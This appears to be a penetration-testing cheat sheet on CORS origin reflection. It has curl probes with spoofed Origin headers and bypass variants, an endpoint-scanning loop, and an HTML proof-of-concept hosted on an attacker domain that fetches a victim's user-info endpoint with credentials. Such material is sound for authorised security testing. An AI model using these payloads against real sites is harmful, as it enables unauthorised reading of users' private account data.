# Origin Reflection Testing

## Summary
Test if the server reflects the Origin header value back in Access-Control-Allow-Origin.

## Basic Reflection Test

```bash
# Send a request with a custom Origin header
curl -H "Origin: https://evil.com" -I https://target.com/api/userinfo

# Check response headers:
# Access-Control-Allow-Origin: https://evil.com  ← REFLECTED!
# Access-Control-Allow-Credentials: true          ← EVEN BETTER
```

## Full Scan Script

```bash
#!/bin/bash
TARGET="https://target.com"
HEADER="Origin: https://evil.com"

# Check all sensitive endpoints
for path in /api/userinfo /api/admin /api/profile /api/account; do
  echo "=== $path ==="
  curl -sI -H "$HEADER" "$TARGET$path" | grep -i "access-control"
done
```

## Null Origin Testing

Some servers trust `Origin: null` (sent by sandboxed iframes, data: URIs, file: URLs).

```bash
curl -H "Origin: null" -I https://target.com/api/userinfo

# If ACA-Origin: null is returned, attacker can exploit from:
# - sandboxed iframe with sandbox="allow-scripts allow-same-origin"
# - data: URI
# - file:// protocol
```

## Regex / Prefix Bypass

```bash
# If the server whitelists https://target.com but uses prefix matching:
curl -H "Origin: https://target.com.evil.com" -I https://target.com/api
curl -H "Origin: https://target.comevil.com" -I https://target.com/api
curl -H "Origin: https://evil.com/target.com" -I https://target.com/api

# Suffix matching bypass
curl -H "Origin: https://evil.com" -I https://target.com/api  # base test
curl -H "Origin: https://eviltarget.com" -I https://target.com/api  # contains

# Subdomain matching that is too permissive
curl -H "Origin: https://target.com.malicious.com" -I https://target.com/api
```

## Headers to Check

| Header | Example | Risk |
|--------|---------|------|
| `Access-Control-Allow-Origin` | `https://evil.com` | High (reflected) |
| `Access-Control-Allow-Credentials` | `true` | High (allows cookies) |
| `Access-Control-Expose-Headers` | `X-Session-Token` | Medium |
| `Access-Control-Allow-Methods` | `GET, POST, PUT, DELETE` | Informational |
| `Access-Control-Allow-Headers` | `X-Custom-Header` | Medium |

## Browser-Based Verification

```html
<!-- Save as cors-test.html and serve from attacker.com -->
<h1>CORS Origin Reflection Test</h1>
<script>
fetch("https://target.com/api/userinfo", { credentials: "include" })
  .then(r => r.text())
  .then(d => document.body.innerHTML += "<pre>" + d + "</pre>")
  .catch(e => document.body.innerHTML += "<p>Blocked: " + e + "</p>");
</script>
```

